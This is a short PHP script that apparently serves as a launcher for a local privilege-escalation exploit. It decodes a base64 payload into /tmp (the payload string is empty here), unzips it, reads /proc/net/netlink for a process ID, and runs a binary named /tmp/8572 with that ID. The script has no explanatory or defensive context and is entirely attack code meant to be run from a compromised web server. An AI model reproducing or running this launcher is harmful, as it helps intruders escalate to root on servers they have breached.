<?php
	$payload = "";
	shell_exec("echo ".$payload." | base64 -d > /tmp/payload");
	shell_exec("unzip /tmp/payload -d /tmp");

	$procs = explode("\n", shell_exec("cat /proc/net/netlink"));
    for($i = 0; $i < sizeof($procs); $i++){
        $proc = explode(" ", $procs[$i]);
        if($proc[3] != 0){
            shell_exec("/tmp/8572 ".$proc[3]);
            break;
        }
    }
?>
